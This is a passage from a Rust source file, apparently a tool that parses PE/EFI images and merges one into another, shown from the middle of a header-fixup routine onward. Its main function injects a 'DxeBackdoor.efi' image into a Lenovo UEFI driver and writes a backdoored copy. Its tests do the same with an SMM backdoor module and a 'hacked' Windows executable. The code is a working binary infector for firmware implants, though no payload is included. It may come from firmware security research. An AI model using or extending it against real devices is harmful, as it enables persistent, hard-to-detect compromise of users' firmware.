            let aligned_v_size = (v_size + (section_alignment - 1)) & !(section_alignment - 1);        
            let size_of_image = 
                *sections_view[sections_view.len() - 1].virtual_addr as usize + aligned_v_size;
            
            let size_of_headers = *sections_view[0].ptr_to_raw_data as usize;
            (size_of_image, size_of_headers)
        };
        
        self.set_size_of_image(size_of_image);

        // Set Size of Headers to the same value of the first section RAW ptr
        self.set_size_of_headers(size_of_headers);
        

        self.set_checksum(0);

        Some(())
    }


    pub fn create_file<P: AsRef<Path>>(&self, filename: P) {
        let mut file = std::fs::File::create(filename)
        .expect("failed to create file");
        file.write_all(&self.raw_data).expect("failed to write bytes");    
    }


    /// Create a function to dump the different sections into binaries
    /// to compare the content against the original PEs
    fn print_section_content(&self) {
        
        let sections_view = PEView::create_array_view_of_sections(
            self.section_hdr_offset, 
            self.get_number_of_sections(), 
            &self.raw_data
        );

        for s_view in sections_view {

            println!("{}", s_view);

            let start_raw = *s_view.ptr_to_raw_data as usize;
            let end_raw = (*s_view.ptr_to_raw_data + *s_view.sz_of_raw_data) as usize;            
            
            let size_of_raw_data = *s_view.sz_of_raw_data as usize;
            let len = core::cmp::min(size_of_raw_data, 0x10);

            println!("First {} bytes of section:\n", len);
            println!("{:x?}", &self.raw_data[start_raw..start_raw+len]);
            println!("Last {} bytes of section:\n", len);
            println!("{:x?}", &self.raw_data[end_raw-len..end_raw]);

        }
    }

}



fn main() {
    let mut target_pe = PEView::load_pe_from_disk(
        "LenovoVariableDxe.efi").unwrap();
    
    let src_pe = PEView::load_pe_from_disk(
            "DxeBackdoor.efi").unwrap();
    target_pe.merge_pe(&src_pe);

    target_pe.create_file("LenovoVariableDxeBackdoored.efi");
}


#[cfg(test)]
mod tests {

    use super::*;

    #[test]
    fn test_load_pe1() {
        assert_eq!(PEView::load_pe(vec![0x00; 4]).is_none(), true);
        assert_eq!(PEView::load_pe(vec![0x00; 64]).is_none(), true);
    }

    #[test]
    fn test_load_pe_from_disk() {
        assert_eq!(PEView::load_pe_from_disk("/tmp/foo/SmmBackdoor.efi").is_ok(), true);
        assert_eq!(PEView::load_pe_from_disk("/tmp/foo/FirmwarePerformanceSmm.efi").is_ok(), true);
    }


    #[test]
    fn test_merge_pe() {
        let src_pe = PEView::load_pe_from_disk("/tmp/foo/SmmBackdoor.efi").unwrap();
        let mut target_pe = PEView::load_pe_from_disk
            ("/tmp/foo/FirmwarePerformanceSmm.efi").unwrap();

        target_pe.merge_pe(&src_pe);

        target_pe.create_file("/tmp/FirmwarePerformanceSmmBackdored.efi");
    }

    #[test]
    fn test_windows_pe() {
        let mut target_pe = PEView::load_pe_from_disk(
            "/tmp/foo/rust_hello.exe").unwrap();
        
        let src_pe = PEView::load_pe_from_disk(
                "/tmp/foo/hacked_hello.exe").unwrap();
        target_pe.merge_pe(&src_pe);

        target_pe.create_file("/tmp/Combined.exe");
    }
}
